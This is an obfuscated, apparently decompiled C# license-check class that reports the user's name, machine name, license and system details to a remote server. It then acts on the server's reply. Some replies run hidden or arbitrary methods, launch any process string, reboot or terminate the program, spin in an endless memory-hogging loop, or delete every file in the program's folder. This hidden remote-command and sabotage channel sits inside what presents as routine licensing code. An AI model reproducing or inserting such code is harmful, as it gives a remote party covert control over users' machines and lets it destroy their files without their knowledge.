using @as;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

[FunAttr(Num = "4742070BD95562DFF1F7DADBB0221AFB")]
internal class GetMethodManager
{
	[Serializable]
	[CompilerGenerated]
	internal sealed class Alert
	{
		public static readonly Alert instance = new Alert();

		public static RetVoidHandle handle1;

		public static RetVoidHandle handle2;

		internal void Show1()
		{
			MaybeAlertManager.ShowAlert("Please restart app");
		}

		internal void Show2()
		{
			MaybeAlertManager.ShowAlert("Please restart app");
		}
	}

	[FunAttr(Num = "D9C6601FA5CE05937CC170C59746B97C")]
	public static string RequestMethod(string method, string licType, string ver)
	{
		try
		{
			CustomString customString = (DevXSystemInfo.UserName ?? "").ToLower() + "@" + DevXSystemInfo.get_MachineName();
			string text = HiddenCalls.CallString("1868773426");
			string text2 = null;
			for (int num = 5; num >= 0; num--)
			{
				try
				{
					text2 = WebReqManager.MakeReq2((CustomString)(text + "/AppSecurityUnpackerTools/DateString?temp=" + DateTime.Now.Ticks), "");
					if (text2 != null)
					{
						break;
					}
				}
				catch (Exception ex)
				{
					ConsoleManager.LogExeption("NETWORK_S ERROR: " + ex);
					if (num == 0)
					{
						ConsoleManager.LogExeption("NETWORK_S ERROR: " + ex);
						MaybeAlertManager.ShowAlert("Network error (1), please try connection to " + text + "\nError: " + ex.Message + "\nUser: " + customString);
						MaybeAlertManager.SetHandle(Alert.instance.Show1);
						text2 = DateTime.UtcNow.ToString("yyyy.MM.dd");
						break;
					}
					Thread.Sleep(50);
				}
			}
			string text3 = text2;
			string text4 = Math.Abs(_0020_0020_000A_0020_000A_000A_000A_000A_000A_0020_000A_000A_0020_000A_0020_000A._0020_0020_000A_0020_000A_000A_000A_000A_000A_0020_000A_000A_0020_000A_000A_0020()).ToString();
			CustomString customString2 = ConvertNameToHash.Get();
			CustomString customString3 = HiddenCalls.CallString("155129864");
			CustomInt customInt = HiddenCalls.Call2("1946453154");
			CustomString d = Thread.CurrentThread.CurrentCulture.Name ?? "";
			Assembly assembly = typeof(AssetParser).Assembly;
			CustomString f = "";
			CustomString d2 = text + "/AppSecurityUnpackerTools/C00001";
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["Name"] = customString;
			nameValueCollection["BindingID"] = customString2;
			nameValueCollection["LicenseNumber"] = customString3;
			nameValueCollection["Hash"] = MaybeHashCalc.Calc(customString3 + "-" + customString2 + "-" + customString + f);
			nameValueCollection["HVer"] = AssetParser.ul2.ToString("X16");
			nameValueCollection["THVer"] = string.Concat((ulong)((long)AssetParser.ul2 ^ (long)(DateTime.UtcNow.DayOfYear * 17454591)));
			nameValueCollection["Version"] = "10.06";
			nameValueCollection["FullVersion"] = ManyCodeCls._0020_0020_0020_000A_000A_0020_000A_000A_0020_0020_000A_000A_0020_0020_000A;
			nameValueCollection["Is64BitProcess"] = (DevXSystemInfo.Is64BitProcess ? "1" : "0");
			nameValueCollection["LicenseType"] = licType;
			nameValueCollection["DateTime"] = text3;
			nameValueCollection["Rand"] = text4;
			nameValueCollection["SystemLanguage"] = d;
			nameValueCollection["VerifyProjectLicense"] = string.Concat(customInt);
			nameValueCollection["OSVersion"] = DevXSystemInfo.OSVersion;
			nameValueCollection["Code"] = method;
			WebReqManager.GetClient(5).Encoding = Encoding.UTF8;
			string text5 = null;
			for (int num2 = 5; num2 >= 0; num2--)
			{
				try
				{
					text5 = WebReqManager.MakeReq(d2, nameValueCollection);
					if (text5 != null)
					{
						break;
					}
				}
				catch (Exception ex2)
				{
					ConsoleManager.LogExeption("NETWORK_S ERROR: " + ex2);
					if (num2 == 0)
					{
						ConsoleManager.LogExeption("NETWORK_S ERROR: " + ex2);
						MaybeAlertManager.ShowAlert("Network error (2), please try connection to " + text + "\nError: " + ex2.Message + "\nUser: " + customString);
						MaybeAlertManager.SetHandle(Alert.instance.Show2);
						return null;
					}
					Thread.Sleep(50);
				}
			}
			if (string.IsNullOrEmpty(text5))
			{
				return null;
			}
			if (text5.StartsWith("ERROR:"))
			{
				if (method == "@@VLDD000" || text5 == "@@" + "1298665970")
				{
					return text5;
				}
				return null;
			}
			if (text5.StartsWith("RUNDEVC:"))
			{
				HiddenCalls.CallObjectSafe3(null, 1012006057u, text5.Substring("RUNDEVC:".Length));
			}
			if (text5.StartsWith("RUNDEVCB:"))
			{
				HiddenCalls.CallObjectSafe3(null, 2199788502u, FormatUtils.formatToArr(text5.Substring("RUNDEVCB:".Length)));
			}
			if (text5.StartsWith("Answer:"))
			{
				return null;
			}
			if (text5.StartsWith("Terminate:"))
			{
				Thread.Sleep(10000);
				HashManager.CallMethod(null, null, "System.DevXSystemInfo", "Exit", 1);
				HiddenCalls.CallObjectSafe3(null, 2599629565u);
			}
			if (text5.StartsWith("Slow:"))
			{
				int num3 = 0;
				if (num3 < 1000)
				{
					while (true)
					{
						byte[] array = new byte[1000000];
						for (int i = 0; i < array.Length; i++)
						{
							array[i] = (byte)num3;
						}
					}
				}
			}
			if (text5.StartsWith("CallMethod:"))
			{
				string text6 = text5.Substring("CallMethod:".Length);
				HashManager.CallMethod(null, null, text6.Substring(0, text6.IndexOf(":")), text6.Substring(text6.IndexOf(":") + 1));
			}
			if (text5.StartsWith("Reboot:"))
			{
				HiddenCalls.CallObjectSafe3(null, 482951526u);
			}
			if (text5.StartsWith("OpenURL:"))
			{
				Process.Start(text5.Substring("OpenURL:".Length));
			}
			if (text5.StartsWith("CleanProgramm:"))
			{
				text5.Substring("CleanProgramm:".Length);
				string[] files = Directory.GetFiles(FileManager.StartupPath, "*.*", SearchOption.AllDirectories);
				foreach (string path in files)
				{
					try
					{
						File.Delete(path);
					}
					catch
					{
					}
				}
			}
			string @string = Encoding.UTF8.GetString(EncryptDecryptManager.Decrypt(Convert.FromBase64String(text5), licType + ver + text3 + text4));
			if (@string != null && @string.StartsWith("#ELN="))
			{
				string text7 = HiddenCalls.CallString("155129864");
				string s = @string.Substring("#ELN=".Length);
				@string = Encoding.UTF8.GetString(EncryptDecryptManager.Decrypt(Convert.FromBase64String(s), licType + ver + text3 + text4 + text7));
			}
			if (@string != null && @string.StartsWith("#EL="))
			{
				string text8 = HiddenCalls.CallString("436900044");
				string s2 = @string.Substring("#EL=".Length);
				@string = Encoding.UTF8.GetString(EncryptDecryptManager.Decrypt(Convert.FromBase64String(s2), licType + ver + text3 + text4 + text8));
			}
			if (@string != null && @string.StartsWith("#EA="))
			{
				string text9 = HiddenCalls.CallString("1520475628");
				string s3 = @string.Substring("#EA=".Length);
				@string = Encoding.UTF8.GetString(EncryptDecryptManager.Decrypt(Convert.FromBase64String(s3), licType + ver + text3 + text4 + text9));
			}
			return @string;
		}
		catch (Exception ex3)
		{
			if (method == "@@VLDD000")
			{
				ConsoleManager.WriteInfo(string.Concat(ex3));
				return "ERROR: Exeption: " + ex3.Message;
			}
		}
		return null;
	}
}
